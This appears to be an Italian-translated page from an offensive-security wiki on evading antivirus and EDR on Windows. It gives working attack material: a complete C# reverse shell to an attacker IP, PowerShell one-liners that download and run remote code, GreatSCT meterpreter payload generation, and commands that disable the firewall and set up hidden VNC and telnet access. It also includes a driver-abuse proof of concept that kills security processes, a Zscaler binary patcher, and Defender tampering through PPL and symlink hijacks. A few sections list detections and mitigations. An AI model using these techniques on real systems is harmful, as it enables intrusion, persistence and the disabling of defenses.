Un modo molto efficace per impedire ai tuoi payload di ottenere il Mark of The Web è impacchettarli all'interno di qualche tipo di contenitore come un ISO. Questo accade perché Mark-of-the-Web (MOTW) **non può** essere applicato a volumi **non NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) è uno strumento che impacchetta i payload in contenitori di output per eludere il Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Ecco una demo per bypassare SmartScreen impacchettando payload all’interno di file ISO usando [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) è un potente meccanismo di logging in Windows che consente alle applicazioni e ai componenti di sistema di **registrare eventi**. Tuttavia, può anche essere usato da prodotti di sicurezza per monitorare e rilevare attività malevole.

In modo simile a come AMSI viene disabilitato (bypassato), è anche possibile fare in modo che la funzione **`EtwEventWrite`** del processo in user space restituisca immediatamente senza registrare alcun evento. Questo si ottiene patchando la funzione in memoria per farla tornare subito, disabilitando di fatto il logging ETW per quel processo.

Puoi trovare più informazioni in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Caricare binari C# in memoria è noto da parecchio tempo ed è ancora un ottimo modo per eseguire i tuoi strumenti di post-exploitation senza farti beccare da AV.

Poiché il payload verrà caricato direttamente in memoria senza toccare il disco, dovremo preoccuparci solo di patchare AMSI per l’intero processo.

La maggior parte dei framework C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, ecc.) fornisce già la possibilità di eseguire Assembly C# direttamente in memoria, ma ci sono diversi modi per farlo:

- **Fork\&Run**

Comporta **l’avvio di un nuovo processo sacrificabile**, iniettare il tuo codice malevolo di post-exploitation in quel nuovo processo, eseguire il tuo codice malevolo e, una volta finito, terminare il nuovo processo. Questo ha sia vantaggi sia svantaggi. Il vantaggio del metodo fork and run è che l’esecuzione avviene **fuori** dal processo del nostro implant Beacon. Questo significa che, se qualcosa nella nostra azione di post-exploitation va storto o viene rilevato, c’è una **molto maggiore probabilità** che il nostro **implant sopravviva.** Lo svantaggio è che c’è una **maggiore probabilità** di essere rilevati dalle **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Si tratta di iniettare il codice malevolo di post-exploitation **nel proprio processo**. In questo modo puoi evitare di creare un nuovo processo e farlo scansionare da AV, ma lo svantaggio è che, se qualcosa va storto nell’esecuzione del tuo payload, c’è una **molto maggiore probabilità** di **perdere il tuo beacon** perché potrebbe crashare.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Se vuoi leggere di più sul caricamento di Assembly C#, controlla questo articolo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) e il loro BOF InlineExecute-Assembly ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Puoi anche caricare Assembly C# **da PowerShell**, guarda [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) e [il video di S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Come proposto in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), è possibile eseguire codice malevolo usando altri linguaggi dando alla macchina compromessa accesso **all’ambiente interprete installato sulla SMB share controllata dall’Attacker**.

Consentendo l’accesso ai binari dell’interprete e all’ambiente sulla SMB share, puoi **eseguire codice arbitrario in questi linguaggi dentro la memoria** della macchina compromessa.

Il repo indica: Defender scansiona ancora gli script ma utilizzando Go, Java, PHP ecc abbiamo **più flessibilità per bypassare le firme statiche**. I test con script reverse shell casuali non offuscati in questi linguaggi hanno avuto successo.

## TokenStomping

Token stomping è una tecnica che consente a un attacker di **manipolare il token di accesso o un prodotto di sicurezza come un EDR o AV**, permettendogli di ridurne i privilegi così che il processo non muoia ma non abbia i permessi per controllare attività malevole.

Per prevenire questo, Windows potrebbe **impedire ai processi esterni** di ottenere handle sui token dei processi di sicurezza.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Come descritto in [**questo post del blog**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), è facile distribuire Chrome Remote Desktop su un PC della vittima e poi usarlo per prenderne il controllo e mantenere la persistenza:
1. Scarica da https://remotedesktop.google.com/, clicca su "Set up via SSH", e poi clicca sul file MSI per Windows per scaricare il file MSI.
2. Esegui l’installer in modalità silenziosa sulla vittima (richiesti privilegi admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Torna alla pagina di Chrome Remote Desktop e clicca su next. La procedura guidata ti chiederà quindi di autorizzare; clicca sul pulsante Authorize per continuare.
4. Esegui il parametro fornito con alcune modifiche: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Nota il parametro pin che consente di impostare il pin senza usare la GUI).


## Advanced Evasion

Evasion è un argomento molto complesso; a volte devi tenere conto di molte fonti diverse di telemetria in un solo sistema, quindi è praticamente impossibile rimanere completamente non rilevati in ambienti maturi.

Ogni ambiente contro cui ti muovi avrà i propri punti di forza e di debolezza.

Ti consiglio vivamente di guardare questo talk di [@ATTL4S](https://twitter.com/DaniLJ94), per ottenere un punto d’appoggio nelle tecniche di Advanced Evasion.

{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

C’è anche un altro ottimo talk di [@mariuszbit](https://twitter.com/mariuszbit) su Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Puoi usare [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), che **rimuoverà parti del binario** fino a quando **scoprirà quale parte Defender** sta rilevando come malevola e te la dividerà.\
Un altro tool che fa **la stessa cosa è** [**avred**](https://github.com/dobin/avred), con un servizio web aperto disponibile su [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Fino a Windows10, tutti i Windows includevano un **server Telnet** che potevi installare (come amministratore) facendo:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Make it **avvii** when the system is started and **eseguilo** now:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Cambia la porta telnet** (stealth) e disabilita il firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Scaricalo da: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (vuoi i download bin, non il setup)

**SUL HOST**: Esegui _**winvnc.exe**_ e configura il server:

- Abilita l'opzione _Disable TrayIcon_
- Imposta una password in _VNC Password_
- Imposta una password in _View-Only Password_

Poi, sposta il binario _**winvnc.exe**_ e il file **appena** creato _**UltraVNC.ini**_ dentro la **victim**

#### **Reverse connection**

L'**attacker** dovrebbe **eseguire dentro** il suo **host** il binario `vncviewer.exe -listen 5900` così sarà **pronto** a catturare una reverse **VNC connection**. Poi, dentro la **victim**: Avvia il daemon winvnc `winvnc.exe -run` ed esegui `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Per mantenere la stealth non devi fare alcune cose

- Non avviare `winvnc` se è già in esecuzione oppure attiverai un [popup](https://i.imgur.com/1SROTTl.png). controlla se è in esecuzione con `tasklist | findstr winvnc`
- Non avviare `winvnc` senza `UltraVNC.ini` nella stessa directory oppure farà aprire [la finestra di configurazione](https://i.imgur.com/rfMQWcf.png)
- Non eseguire `winvnc -h` per l'help oppure attiverai un [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Scaricalo da: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Inside GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Ora **avvia il lister** con `msfconsole -r file.rc` ed **esegui** il **payload xml** con:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Il difensore corrente terminerà il processo molto rapidamente.**

### Compilare la nostra reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Prima Revershell C#

Compilalo con:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Usalo con:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# usando compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Download ed esecuzione automatici:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista di offuscatori C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Using python per esempio di injector di build:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Altri strumenti
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Uccidere AV/EDR dallo spazio kernel

Storm-2603 ha sfruttato una piccola utility da console nota come **Antivirus Terminator** per disabilitare le protezioni endpoint prima di rilasciare il ransomware. Lo strumento porta il proprio **driver vulnerabile ma *signed*** e ne abusa per eseguire operazioni kernel privilegiate che persino i servizi AV Protected-Process-Light (PPL) non possono bloccare.

Key take-aways
1. **Signed driver**: Il file distribuito su disco è `ServiceMouse.sys`, ma il binario è il driver legittimamente signed `AToolsKrnl64.sys` del “System In-Depth Analysis Toolkit” di Antiy Labs. Poiché il driver ha una valida signature Microsoft, viene caricato anche quando Driver-Signature-Enforcement (DSE) è abilitato.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
La prima riga registra il driver come **kernel service** e la seconda lo avvia, così che `\\.\ServiceMouse` diventi accessibile da user land.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Termina un processo arbitrario per PID (usato per uccidere i servizi Defender/EDR) |
| `0x990000D0` | Elimina un file arbitrario su disco |
| `0x990001D0` | Scarica il driver e rimuove il servizio |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD salta completamente le protezioni user-mode; il codice che viene eseguito nel kernel può aprire processi *protected*, terminarli o manipolare oggetti kernel indipendentemente da PPL/PP, ELAM o altre funzionalità di hardening.

Detection / Mitigation
•  Abilita la vulnerable-driver block list di Microsoft (`HVCI`, `Smart App Control`) così che Windows rifiuti di caricare `AToolsKrnl64.sys`.
•  Monitora la creazione di nuovi servizi *kernel* e genera un alert quando un driver viene caricato da una directory world-writable o non è presente nella allow-list.
•  Controlla handle in user-mode verso oggetti device custom seguiti da chiamate `DeviceIoControl` sospette.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

**Client Connector** di Zscaler applica localmente le regole di device-posture e si affida a Windows RPC per comunicare i risultati agli altri componenti. Due scelte di design deboli rendono possibile un bypass completo:

1. La valutazione della posture avviene **interamente lato client** (al server viene inviato un boolean).
2. Gli endpoint RPC interni verificano solo che l’eseguibile connesso sia **signed by Zscaler** (tramite `WinVerifyTrust`).

Con **patching di quattro binary signed su disco** entrambi i meccanismi possono essere neutralizzati:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Restituisce sempre `1` quindi ogni check risulta conforme |
| `ZSAService.exe` | Chiamata indiretta a `WinVerifyTrust` | NOP-ed ⇒ qualsiasi processo (anche unsigned) può collegarsi ai pipe RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Sostituito con `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Short-circuited |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Dopo aver sostituito i file originali e riavviato lo stack dei servizi:

* **Tutti** i controlli di postura mostrano **verde/compliant**.
* I binari non firmati o modificati possono aprire gli endpoint RPC named-pipe (ad es. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* L'host compromesso ottiene accesso illimitato alla rete interna definita dalle policy di Zscaler.

Questo case study dimostra come decisioni di trust puramente lato client e semplici controlli di firma possano essere aggirati con poche patch di byte.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) applica una gerarchia di signer/level in modo che solo processi protetti di livello uguale o superiore possano manomettersi a vicenda. In ottica offensiva, se puoi avviare legittimamente un binario abilitato a PPL e controllarne gli argomenti, puoi trasformare una funzionalità benigna (ad es. il logging) in una primitive di scrittura vincolata, supportata da PPL, contro le directory protette usate da AV/EDR.

Cosa rende un processo eseguito come PPL
- L'EXE target (e qualsiasi DLL caricata) deve essere firmato con una EKU compatibile con PPL.
- Il processo deve essere creato con CreateProcess usando i flag: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Deve essere richiesto un protection level compatibile che corrisponda al signer del binario (ad es. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` per signer anti-malware, `PROTECTION_LEVEL_WINDOWS` per signer Windows). Livelli errati falliranno alla creazione.

Vedi anche un'introduzione più ampia a PP/PPL e alla protezione di LSASS qui:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Tooling di avvio
- Helper open-source: CreateProcessAsPPL (seleziona il protection level e inoltra gli argomenti all'EXE target):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Pattern di utilizzo:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Il binario di sistema firmato `C:\Windows\System32\ClipUp.exe` si auto-avvia e accetta un parametro per scrivere un file di log in un percorso specificato dal chiamante.
- Quando viene avviato come processo PPL, la scrittura del file avviene con supporto PPL.
- ClipUp non riesce a parsare percorsi contenenti spazi; usa short path 8.3 per puntare a posizioni normalmente protette.

8.3 short path helpers
- Elenca i nomi short: `dir /x` in ciascuna directory padre.
- Ricava il short path in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Avvia il LOLBIN capace di PPL (ClipUp) con `CREATE_PROTECTED_PROCESS` usando un launcher (per esempio, CreateProcessAsPPL).
2) Passa l'argomento del log-path di ClipUp per forzare la creazione di un file in una directory AV protetta (per esempio, Defender Platform). Usa short name 8.3 se necessario.
3) Se il binario target è normalmente aperto/bloccato dall'AV mentre è in esecuzione (per esempio, MsMpEng.exe), programma la scrittura al boot prima che l'AV parta installando un servizio auto-start che venga eseguito in modo affidabile prima. Verifica l'ordine di avvio con Process Monitor (boot logging).
4) Al riavvio la scrittura supportata da PPL avviene prima che l'AV blocchi i propri binari, corrompendo il file target e impedendo l'avvio.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes e vincoli
- Non puoi controllare il contenuto che ClipUp scrive oltre al posizionamento; il primitive è adatto alla corruzione più che all’iniezione precisa di contenuti.
- Richiede local admin/SYSTEM per installare/avviare un servizio e una finestra di reboot.
- Il timing è critico: il target non deve essere aperto; l’esecuzione al boot evita i lock dei file.

Rilevamenti
- Creazione di processo `ClipUp.exe` con argomenti insoliti, soprattutto se lanciato da launcher non standard, intorno al boot.
- Nuovi servizi configurati per l’avvio automatico di binari sospetti e che partono costantemente prima di Defender/AV. Indagare creazione/modifica del servizio prima dei fallimenti di avvio di Defender.
- File integrity monitoring sui binari di Defender/directories Platform; creazioni/modifiche di file inattese da parte di processi con flag di protected-process.
- Telemetria ETW/EDR: cercare processi creati con `CREATE_PROTECTED_PROCESS` e uso anomalo del livello PPL da parte di binari non AV.

Mitigazioni
- WDAC/Code Integrity: limitare quali binari firmati possono essere eseguiti come PPL e sotto quali parent; bloccare l’invocazione di ClipUp fuori dai contesti legittimi.
- Service hygiene: limitare la creazione/modifica di servizi auto-start e monitorare la manipolazione dell’ordine di avvio.
- Assicurarsi che Defender tamper protection ed early-launch protection siano abilitati; indagare errori di avvio che indicano corruzione del binario.
- Considerare la disabilitazione della generazione dei nomi brevi 8.3 sui volumi che ospitano tooling di sicurezza, se compatibile con il tuo ambiente (testare a fondo).

Riferimenti per PPL e tooling
- Panoramica Microsoft Protected Processes: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- Riferimento EKU: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (validazione dell’ordine): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Writeup della tecnica (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender sceglie la piattaforma da cui eseguire enumerando le sottocartelle sotto:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Seleziona la sottocartella con la stringa di versione lessicograficamente più alta (ad esempio, `4.18.25070.5-0`), poi avvia da lì i processi del servizio Defender (aggiornando di conseguenza i percorsi di servizio/registry). Questa selezione si fida delle directory entries, inclusi i directory reparse points (symlinks). Un amministratore può sfruttare questo comportamento per reindirizzare Defender verso un path scrivibile dall’attaccante e ottenere DLL sideloading o service disruption.

Prerequisiti
- Local Administrator (necessario per creare directory/symlink sotto la cartella Platform)
- Possibilità di reboot o di forzare una nuova selezione della piattaforma Defender (riavvio del servizio al boot)
- Richiesti solo built-in tools (mklink)

Perché funziona
- Defender blocca le scritture nelle proprie cartelle, ma la selezione della piattaforma si fida delle directory entries e sceglie la versione lessicograficamente più alta senza verificare che il target risolva verso un path protetto/attendibile.

Passo per passo (esempio)
1) Preparare una clone scrivibile della cartella della piattaforma corrente, ad esempio `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Crea un symlink di directory con versione superiore dentro Platform che punti alla tua cartella:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Selezione del trigger (riavvio consigliato):
```cmd
shutdown /r /t 0
```
4) Verifica che MsMpEng.exe (WinDefend) venga eseguito dal percorso reindirizzato:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Dovresti osservare il nuovo percorso del processo sotto `C:\TMP\AV\` e la configurazione del servizio/registro che riflette quella posizione.

Opzioni post-exploitation
- DLL sideloading/code execution: Rilascia/sostituisci DLL che Defender carica dalla sua directory dell'applicazione per eseguire codice nei processi di Defender. Vedi la sezione sopra: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Rimuovi il version-symlink così, al successivo avvio, il percorso configurato non si risolve e Defender non riesce ad avviarsi:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Nota che questa tecnica non fornisce privilege escalation da sola; richiede diritti admin.

## API/IAT Hooking + Call-Stack Spoofing con PIC (stile Crystal Kit)

I red team possono spostare l’evasione runtime fuori dal C2 implant e dentro il modulo target stesso, facendo hook della sua Import Address Table (IAT) e instradando API selezionate attraverso codice position‑independent (PIC) controllato dall’attaccante. Questo generalizza l’evasione oltre la piccola superficie API esposta da molti kit (es. CreateProcessA) e estende le stesse protezioni a BOFs e DLL post‑exploitation.

Approccio di alto livello
- Carica un blob PIC accanto al modulo target usando un reflective loader (prependuto o companion). Il PIC deve essere self-contained e position‑independent.
- Man mano che la DLL host viene caricata, analizza il suo IMAGE_IMPORT_DESCRIPTOR e patcha le entry IAT per gli import target (es. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) in modo che puntino a wrapper PIC sottili.
- Ogni wrapper PIC esegue tecniche di evasione prima di fare tail-call al vero indirizzo API. Le evasioni tipiche includono:
- Memory mask/unmask attorno alla chiamata (es. encrypt regioni beacon, RWX→RX, cambia nomi/permessi delle pagine) e poi ripristino post-chiamata.
- Call-stack spoofing: costruisci uno stack benigno e transizioni verso l’API target così che l’analisi del call-stack risolva frame attesi.
- Per compatibilità, esponi un’interfaccia così che uno script Aggressor (o equivalente) possa registrare quali API hookare per Beacon, BOFs e DLL post-ex.

Perché qui IAT hooking
- Funziona per qualsiasi codice che usi l’import hookato, senza modificare il codice del tool o dipendere da Beacon per fare proxy di API specifiche.
- Copre le DLL post-ex: hookare LoadLibrary* ti permette di intercettare i caricamenti di modulo (es. System.Management.Automation.dll, clr.dll) e applicare la stessa evasione di masking/stack alle loro chiamate API.
- Ripristina l’uso affidabile dei comandi post-ex di process-spawning contro le rilevazioni basate sul call-stack, facendo wrapping di CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- Applica la patch dopo le relocations/ASLR e prima del primo uso dell'import. Loader reflectivi come TitanLdr/AceLdr dimostrano hooking durante `DllMain` del modulo caricato.
